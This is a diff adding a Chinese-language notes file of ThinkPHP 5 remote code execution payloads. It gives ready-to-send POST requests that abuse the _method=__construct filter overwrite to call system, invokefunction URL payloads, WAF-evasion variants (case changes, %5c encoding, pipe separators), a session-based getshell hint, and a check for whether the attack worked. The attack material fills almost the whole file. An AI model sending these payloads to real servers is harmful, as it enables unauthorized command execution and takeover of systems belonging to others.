@@ -1,0 +1,44 @@
+原理（两条独立链，只有链②需要 `\think\` 字面量）：
+① `Request` 的 `method` 属性可控 → `__construct` 变量覆盖 `filter` 字段 → `param()/input()` 走 `filterValue()` → `call_user_func` RCE。
+② 兼容模式控制器名未校验 → 任意类任意方法（需要 `\think\`）。
+
+=== 链①（零关键字，全走 POST body，绕 URL 层 WAF）===
+
+# 首选：默认路由，不依赖 captcha
+POST /?s=index/index HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+s=whoami&_method=__construct&method=POST&filter[]=system
+
+# 等价写法（值放在 get[] 里）
+POST /?s=index/index HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+_method=__construct&method=GET&filter[]=system&get[]=whoami
+
+# 依赖 captcha 这类 method 路由时才有效
+POST /?s=captcha HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+_method=__construct&filter[]=system&method=get&get[]=id
+
+# 另一种变量名承载命令
+POST /?s=index/index HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+aaaa=whoami&_method=__construct&method=GET&filter[]=system
+
+=== 链②（需要 `\think\`，WAF 可能拦）===
+?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+?s=index/think\config/get&name=database.username      ← 前导反斜杠可省
+?s=index|think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id   ← 用 | 替代 /
+?s=index/THINK\APP/invokefunction&...                 ← PHP 类名不区分大小写
+?s=index/%5cthink%5capp/invokefunction&...            ← %5c 编码
+5.0.23 另有 \think\Session::set 写 session 值 + think\__include_file 包含 getshell
+
+=== 判定 ===
+响应体出现命令输出即命中；若被 filter 改动导致回显丢失，改 filter[]=phpinfo 先确认链路通。
+`filter` 这个键名不可改（Request 字段名固定），可改的只有后面的函数名。
+
+来源：https://github.com/safe6Sec/tp5rce （README 全文，已读，未在靶标验证）
+注意：原文明确 `?s=captcha` 变体"需存在 captcha 这类 method 路由"，不存在时用 `?s=index/index`。
